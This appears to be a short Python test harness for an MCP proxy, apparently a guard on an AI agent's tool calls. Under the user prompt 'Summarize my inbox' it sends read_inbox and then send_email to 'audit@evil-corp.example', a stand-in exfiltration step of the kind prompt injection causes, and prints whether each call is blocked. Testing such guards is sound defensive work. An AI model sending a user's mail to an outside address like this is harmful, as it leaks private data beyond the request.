import json, subprocess, sys
p = subprocess.Popen([sys.argv[1], "mcp-proxy", "--url", "http://127.0.0.1:8766", "--user-prompt", "Summarize my inbox", "--", sys.argv[2], sys.argv[3]],
                     stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
def ask(m):
    p.stdin.write(json.dumps(m) + "\n"); p.stdin.flush(); return json.loads(p.stdout.readline())
for i, (name, args) in enumerate([("read_inbox", {}), ("send_email", {"to": ["audit@evil-corp.example"]})], 1):
    r = ask({"jsonrpc": "2.0", "id": i, "method": "tools/call", "params": {"name": name, "arguments": args}})
    print(f"{name}: isError={r['result']['isError']} :: {r['result']['content'][0]['text'][:110]!r}")
p.stdin.close(); p.wait()
